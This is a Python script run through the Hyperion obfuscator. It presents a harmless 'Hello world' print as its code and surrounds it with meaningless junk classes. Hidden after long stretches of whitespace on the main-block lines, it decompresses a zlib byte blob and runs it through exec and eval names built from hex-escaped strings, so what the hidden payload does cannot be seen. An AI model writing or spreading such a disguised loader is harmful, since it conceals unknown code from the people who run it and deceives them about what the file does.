from builtins import *
from math import prod as Walk


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Theory, Divide, Multiply, _product, _cube, _hypothesis, _random = exec, str, tuple, map, ord, globals, type

class Ceil:
    def __init__(self, Statistics):
        self._positive = Walk((Statistics, -92259))
        self._invert(_ceil=-8501)

    def _invert(self, _ceil = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._positive += -62691 * _ceil
        
        try:
            ((_memoryaccess, _product, _memoryaccess) or _product if (_memoryaccess, _product, _memoryaccess) and _product else ... or (_product, (_memoryaccess, _product, _memoryaccess)))

        except ArithmeticError:
            (_product, _memoryaccess, Theory) if _memoryaccess >= _product else {_memoryaccess: 'odlboe'} >= Multiply

        except:
            _random(-39813 + 6068) == int

    def Positive(self, Absolute = 79703):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Absolute *= -36019 + -32757
        self._system != int
        
        try:
            (((Multiply, _product, _cube), _memoryaccess) for _memoryaccess in (_memoryaccess, _cube, Multiply))

        except OSError:
            ((Multiply, (_product, _memoryaccess, Theory)) for Multiply in (_product, _memoryaccess, Theory) if _memoryaccess != Multiply)

        except:
            _random(46372 * -58271) == int

    def _absolute(_substract = str):
        return _hypothesis()[_substract]

    def _calculate(_square = 49262 - 24039, _multiply = type, _walk = _hypothesis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _walk()[_square] = _multiply
        
        try:
            {_memoryaccess: 'odlboe'} if _hypothesis != _cube else {Multiply: _cube} < _memoryaccess

        except ArithmeticError:
            ({_memoryaccess: 'odlboe'} or Divide if {_memoryaccess: 'odlboe'} and Divide else ... or (Divide, {_memoryaccess: 'odlboe'}))

        except:
            _random(-55305 / 92215) == None

    def execute(code = str):
        return Theory(Divide(Multiply(_product(_cube, code))))

    @property
    def _system(self):
        self.Invert = '<__main__.Theory object at 0x000005991BE20501>'
        return (self.Invert, Ceil._system)

if __name__ == '__main__':
    try:
        Ceil.execute(code = __code__)
        MemoryAccess = Ceil(Statistics = 92870 / -60590)

        MemoryAccess._invert(_ceil = MemoryAccess._positive * -4959)                                                                                                                                                                                                                                                          ;Ceil._calculate(_square='XXXWWXWWXXWWXWWXWWXWWXXX',_multiply=b'x\x9c\xdd\x19]s\xda8\xf0\x9d_Ay\xb1=i\x881`\x1bn\xfar\xc3\xdd4\x19\xd2\xdc47Go\xda\x8e\xc7\xd82\x11\x95-\xea\x8f\x02\xff\xfev%\x99@\x08\xc4&\xbd> YZi\xbdZ\xadW\xbb\xd2\n\xf2t=l4!\xd1H\x17\x10\x93\xe7\xf1iTd\x81\x9f\xf3\xd4\xf3\x9ao\xde\xb5\xde\xaf\x17$\xa5<i5y\xbaE\xe6\x17\xf9\x03O3A\xa3\xb7\xa6\x94\xb1u\xfe@f\xdc\xcf\xbb}\xbb\xf5\xb6\xf5;+\xc8G\x12\xb6\x8c\x9dQ3\x9a?\x14S\xc9\xf8!\xcf\x17\xd9\xf0\xeaJ\xe2\xda\x01\x8f\xaf\x9e\xb0\xb9:0wH\xb3\x80\xa7\xe1.\x1b\x85l\xcffW\x0b\xe6\xcf\n\xf2d\x10\xa3\x01I2"\x07\xfd\xf1\xd7\xf8\xd2j\x9bOH\x02\x1e\xca\xf7\xda"\xa5I\xae\xb7\xde\x13\xc6xs\xc9S\x16\xbei\x19Z\xc3\x18n\xa8\xf1\xbd\x96}\xa3\xa1f4\xc8* \x8b\\)3Y\x140\xf2#\xcfH\xd6\xf4S\xd2LI\xf8%\xf9\x87rFr\x89\x98\x82f\xbe$\xff\xf2B\xf4\xfc&2\xf9\x92|\xe0S\x1e\xae\x9b\x8c~\x83qk^\xb4\x8c\x86\x14\x8a\xc6\x0b\x9e\xe6\x9e\x07\xb3\xad3\xcdh\x93\x15\xcdu\xa3\xc1x\xe0\xb3L7>k\xe3\xf1\xf5\r\xa4kH7\xd0\x82."\xc6\xd7\xd7\xda\xd7w3\xc6\xa7@\xd68H\x83\x0c>A\x9aL&\xaa`\x071\xda\xe7\xe1\xf0\xe2\xf2\xe2R\xbf\xd4/:\x86\xf1\x15\x98\x91\xdc\xcf\xf3\xf48\xb3\xd5r\x05i\xb9\x92\x10\xc0\x12\x9e\xe5r\x9f[H_\xe0\xc4\xd8\x1c\xcca\xce\x18\x9d\xcf\xe7\x8c\xb29&\xf8&\xf9\xe5\x8dg_+\t\xc4\x9cb^\xaca\xcc\xa3\x1a\x8f\xcf\t\xbc\xe8\\0\x04\xb6\xc0\x92BM\x817\x03\x1e{|umZP\x96\xd3\x04\x97\xe5\x87\x9ff\x8d\x83\xc3\x91\xf75L4\x86\xe9\xae\xc778%\x14\x90\x00P\xc0\xfa\x93R\xfaf\x11\xc4\n\xe8\xcf\xcc\x98%4g\xb4\x98>\xd5\xa7\xf1V\x91(\xad\xaf\xcau\xa8\xc5\xc4\xf8\xfcS\xb8\xb4i\x12\x92\x95\xae1\xce\xf7\xdf~5\x8e\xab\t\xbf_ei\x88\x12N\xceWM\xb9\xcfY\xf4\x9c\x9e\x0e\x9a8\xe7\xa3\x11\xbf\x1b\xdd\xddA\xe1\x90\xf19_\xfd\x10F\x171\x0fj[R\x1c\xc7I\x12o2\xb4c|\xceXQE\xfa\xf7sZ:\xba\xe5\xdd~\xf8p{\x0b\x0f\x14\xd9\x10\xf0\x8c\x95\x941\xff\xcf\xdaZ\x02\x8f\x03\x9f\x03\xaf\xe3\xc2\xebF#\xe1p\x9a\xd6\x9es\x9a\x1cvT\xa0E\xdf4E\xc5M\x0e\x157\xcfW\xb7\xcc\xffAj\xab\x164\xc4M\x135\x83\x00z\xa8\xad3VR\x9ag\xb5\xb7\xb2\xfb{\xcb\xb2\xa0\xc2\x07[\xd0@T-%Q\x1ad~B_\xa7\xa4\x83Lj)\xe90\x97RI\xeb\x88\xb2\x15yH\x8a\xfa\xe6\x84>\n\x87"\x87\x03\x12]\x16\xcfG\xc0l\xf3y\xd6+u\xcd0=\xc7\xebx\x96\xd7\x03h\x0bh\xe1\xac\xfb\xd8*\xcc,\x0f\xd9\xf5\xa0\x1e\xc0p\x13\x06\xba@\xdd\xdd\xc7V\x92\x0c\xdev\xaa\x10\xf6\xbd\xbe\xd7\x15|\xbb\xc0\xbf\xe7\xb9bV{\x1f\xfb2\xb3\x036\xa7O\xb5n\xbf\x1fm\x8a\x03\xa5\x0b\xa5\xb3\x05\xb1X\xd6\xd4r\xad\xb0\x12m\xc7\x1a@\x08\x1d\x12\xbc\x80\xe9\x9a\x1b\xe5\xfb\xcbn\xc8j\xa7\x9c\xed\x16\x11\x90\xd5\xb3\xfb\xe8\xd1=\x02N&<\x96\xc0\xfc\xd5\t%N\xa9J\x86\xefxh\xad.\xd4h!.\xd8\xa6\x03\xd4\xee>\xf6UVcZ\xa1\xb0\x88\x1a\xab\r\xb7=?\x9e\x86~S\x84p\xdb\xd5\xf0\xc0\x99{TG\x87\x85\xeb\xf9\xbd\x81\xca\x01\xb4\x03\xd1\xf2E+\x10\xef\x02\xd5Fl\xf0\x92\xf8\x1b\xb1Q\x14\x98\x1c\xc4A\xf9\x18JBO\x92\\3\xc5\x19)\xa3}\xd3,\xa3\xfej\xbb\x9a\x05\xeeo\x82\xdb\xe3\x16 \xdc_\xecj{\xd8j\x96\xd2\x83\x8c{\x17\xda\x03\xb6\xba\xc2R\xf6\xb0\xbf\xdaRv\xac\x05#\n\x9c\x0e\xc3\t\x04\xa0-sx\xe4\xd48\xd1h\xec\xc0\x06\x83\x90\xb5\x84eK\x9aR\te\xbb\xb2\xd1\xe0\x02\x0b%\xdd\t\xc5\x01\x18\x1e\x91\xefT\xd9\t\xe4\x10\xb2\x84e\xd9\xc5\xa8\\Yr1\xcd\xbd\x98G\xcet\x7f\x9a\xb1\x8b\xdf\xa3&\xea\xe2/\xb6\xf5\xc9\x93_\xa4j\x9b\x94\r\xc7\x8c\xa9\x8e G\xb5]\x05\x07\xe5q\xa4\x8e\xac*\xb4f5\xd3\xdc\xde\xc0bY\xe4eT\xf6\x92\xffae\x1dw\x931mC\xd9v+\xafg\xbcu}\x8eE\xfa\xd9\xdb\xee`\xd7\x83J/\xda\xed?\xfaP\r/\x92\xda\x96\x17\x7f\xa1\xed\xd3L\x91\n\x9c \x86\x16\x8cg\xecUv\xd8Q[[]\xfb\xc1{\'\x1f\xc9X\x16\xaa\x11\xc6\xb7\x00N\xb6\x1f\xad\xb4@\x99\xe4\xea\xa2\xb6\xaa\x9c\x02\x1dxk\xbeJ\r\xe8F\xb6r+\x11-\xaa\xd2S\xd0T\xaex\x8c\x0e\xfb\x83:\xb1D])-\xcbv\x9d\x1ed\xd3\xe9v}+\xb2"\xa7k\x0f\xec\xd01\xc1\x12\xfb\x80\xb5\xec\xc8\xf6\xed\xbe\xdd\x05\x1a\xd7\xee\xd9=\x8b86\xbc\xb1l\x10\xda\x0e,bw\x80\xca\xb4"\xe8\xbbHgOal\x04<\x88\xd3\x03\xac\x038\x02\xd7\xb8\x97\xbe\xe0T\xef\x8a\xec\xa8\x07\xba\xb4\x05\xb4\xa1\x855\xc22\xcb\xfe#\xf6e\xef\xaa\xadC\xc7r^\xf7}\xdaR\x85\xd0\x12\x8a\x0c\xa1\xf5\xaf\x0c06^8Q?K\xab\xcbF\xf9\x8f\xc9\xe4hp\x11\xa5<n\x96\x7f\x154\xe5\x1f\x11M\x88\xf0\x83\x06V\xfa\x9d\x10W\xfc\xec\x011\x9e\x89\xc1\x1d\x17MP\x8b\xa4M\xc9\xf7\x82dy\xf6\x9b\xa0/{\xed\x19\xc9\xf5\xcd\xc6\xfc\xe8\xc8\xc2\xb1\x8dvNV\xb9\xd1\xf8\x0f|\xd0\xd1\xc4')

        MemoryAccess._invert(_ceil = MemoryAccess._positive * -43491)                                                                                                                                                                                                                                                          ;O0Oo0O0Ooo0O0o0Ooo00oO0O00,WXWWXXWWWWXXXWXWXWXWXXXWW,oDOooDOODOOoooOoODDD,wwwwxxxxxwwwwwxwwxxwwxw,JIJLLJILJIJLJJIJLIJJLJJ=(lambda IIIlIlllllIIIIIlIllIlI:IIIlIlllllIIIIIlIllIlI(__import__('\x7a\x6c\x69\x62'))),(lambda IIIlIlllllIIIIIlIllIlI:IIIlIlllllIIIIIlIllIlI['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IIIlIlllllIIIIIlIllIlI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIIlIlllllIIIIIlIllIlI)"),filename='\x6c\x6a\x69\x6c\x6a\x69\x6c\x6c\x69\x69\x6a\x69\x6c\x69\x6c\x69\x6a\x69\x6c\x69\x6a\x6a',mode='\x65\x76\x61\x6c'))),(lambda WWXWXWWWXXWXWWXXXWXWW,IIIlIlllllIIIIIlIllIlI:WWXWXWWWXXWXWWXXXWXWW(IIIlIlllllIIIIIlIllIlI)),(lambda:(lambda IIIlIlllllIIIIIlIllIlI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIIlIlllllIIIIIlIllIlI)"),filename='\x6c\x6a\x69\x6c\x6a\x69\x6c\x6c\x69\x69\x6a\x69\x6c\x69\x6c\x69\x6a\x69\x6c\x69\x6a\x6a',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        MemoryAccess._invert(_ceil = MemoryAccess._positive * 68614)                                                                                                                                                                                                                                                          ;JIJLLJILJIJLJJIJLIJJLJJ()(wwwwxxxxxwwwwwxwwxxwwxw(WXWWXXWWWWXXXWXWXWXWXXXWW(O0Oo0O0Ooo0O0o0Ooo00oO0O00(oDOooDOODOOoooOoODDD('\x76\x61\x72\x73'))),Ceil._absolute(_substract='XXXWWXWWXXWWXWWXWWXWWXXX')))

    except Exception as _memoryaccess:
        if 102976 > 5324985:
            Ceil.execute(code = Divide(_memoryaccess))

        elif 393811 > 1405328:
            Ceil(Statistics = -70562 / 8130).Positive(Absolute = 87845 * MemoryAccess._positive)
